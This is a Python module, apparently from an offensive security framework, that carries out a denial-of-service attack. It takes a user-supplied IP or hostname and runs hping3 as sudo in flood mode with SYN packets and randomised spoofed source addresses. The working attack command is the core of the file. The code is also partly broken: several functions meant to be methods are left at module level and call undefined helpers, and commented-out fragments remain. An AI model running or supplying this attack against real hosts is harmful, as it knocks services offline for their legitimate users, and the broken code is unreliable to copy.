""" Denial-of-Service Module
- Module that sends a succession of SYN requests to the target system
  to make the system unresponsive to legitimate traffic
"""

from .base import BaseModule
from utils.secure_utils import run_user_command, validate_ip_address, validate_hostname
from utils.config import Config
from utils.font_styles import error_message, info_message, success_message


class DoS(BaseModule):
    """DoS module for executing Denial-of-Service attacks."""

    def __init__(self):
        self.name = "dos"
        self.full_name = "DoS"
        self.description = "Denial-of-Service attack"
        self.options = "TARGET"
        self.requires_target = True
        self.target = None

    def run(self, target=None):
        """Execute DoS attack on target."""
        if target is None:
            error_message("Target required for DoS attack")
            return

        self.target = target

        if not self._validate_target():
            return

        self._execute_core_logic()

    def main(self):
        """Interactive prompt mode."""
        self._show_module_header()
        self.target = self._get_input("Target IP or hostname")

        if not self._validate_target():
            self._prompt_continue()
            return

        self._execute_core_logic()
        self._prompt_continue()

    def _validate_target(self, target=None):
        """Validate target IP or hostname."""
        target = target or self.target
        if not (validate_ip_address(target) or validate_hostname(target)):
            error_message(f'Invalid target "{target}"')
            return False
        return True

    def _execute_core_logic(self):
        """Execute the DoS attack."""
        info_message(f"Running DoS attack on {self.target}")
        info_message("Running a DoS attack properly requires the command to be run using sudo")
        print()

        cmd_args = [
            "sudo",
            "hping3",
            "-c",
            "10000",
            "-d",
            "120",
            "-S",
            "-w",
            "64",
            "-p",
            "21",
            "--flood",
            "--rand-source",
            self.target,
        ]

        try:
            run_user_command(cmd_args, timeout=600, use_shell=False, capture_output=False)
        except Exception as e:
            error_message(f"DoS attack failed: {e}")
            return

        print()
        success_message(f"Finished attacking {self.target}")
        # elif prompt_input == "run":
        # self.execute_attack()
    # elif prompt_input == "exit":
    # exit_program()
# elif prompt_input == "back":
# return
# elif prompt_input == "":
# continue
# elif prompt_input == "help":
# self.show_help()
# elif prompt_input == "clear":
# safe_clear_screen()
# else:
# self.handle_invalid_command(prompt_input)

def show_options(self):
    """Display the module options"""
    value = get_target() or "(not set)"
    table = [["OPTIONS", "VALUE", "OPTIONAL?"], ["TARGET", value, "no"]]
    print(tabulate(table, headers="firstrow", tablefmt="fancy_grid"))

def set_target(self, prompt_input):
    """Set the target for the attack"""
    option = prompt_input.split()[2]
    set_target(option)
    success_message(f'TARGET set to "{get_target()}"')

def execute_attack(self):
    """Execute the DoS attack"""
    target = get_target()
    if not target:
        error_message("Cannot run DoS attack without TARGET being specified. Please specify the TARGET and try again")
    else:
        self.run(target)

def show_help(self):
    """Display help information for the module"""
    print()
    print(f'{cyan(f"Help for {self.name}:", ["bold", "underlined"])}')
    print()
    print(f'[{yellow("Optional", "italic")}] See options that you can set using {yellow("show options", "bold")}')
    print(f'1. Set the target using {yellow("set TARGET 123.456.789", "bold")} or {yellow("TARGET => 123.456.789", "bold")} (replace with target IP)')
    print(f'2. Run your attack using {yellow("run", "bold")}')
    print()

def handle_invalid_command(self, prompt_input):
    """Handle invalid command inputs"""
    invalid_command = prompt_input.split()[0]
    error_message(f'Invalid command "{invalid_command}". Please enter a valid command')
